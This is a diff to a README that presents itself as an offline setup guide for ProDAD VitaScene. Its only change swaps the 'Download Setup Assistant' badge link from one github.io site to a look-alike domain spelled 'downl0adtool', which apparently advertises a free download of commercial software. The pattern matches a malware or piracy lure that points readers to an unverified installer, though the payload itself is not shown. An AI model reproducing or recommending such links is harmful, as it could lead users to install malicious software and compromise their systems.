@@ -1,6 +1,6 @@
 # ProDAD VitaScene — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://prodad-vitascene-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://prodad-vitascene-downl0adtool.github.io/.github/)
 
 ---
 
